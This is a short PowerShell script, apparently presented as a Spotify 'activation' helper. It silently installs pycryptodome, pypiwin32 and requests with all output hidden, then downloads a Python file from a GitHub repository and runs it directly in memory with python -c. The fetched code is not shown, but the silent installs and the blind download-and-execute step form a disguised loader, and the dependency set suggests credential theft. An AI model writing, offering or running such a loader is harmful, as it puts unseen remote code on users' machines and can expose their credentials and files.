# [1] Check for Python (only shows message if missing)
try { python --version >$null 2>&1 } catch { 
    Write-Host "⚠️ Install Python first: https://python.org"
    exit 1 
}

# [2] Install requirements silently
python -m pip install --upgrade pip >$null 2>&1
python -m pip install pycryptodome pypiwin32 requests >$null 2>&1

# [3] Download and execute Python script DIRECTLY
$url = "https://raw.githubusercontent.com/QUADROisCoding/EZ_ACTIVATE/main/Spotify_version.py"
$webClient = New-Object System.Net.WebClient
$webClient.Headers.Add("User-Agent", "PowerShell")
$pythonCode = $webClient.DownloadString($url)
python -c $pythonCode
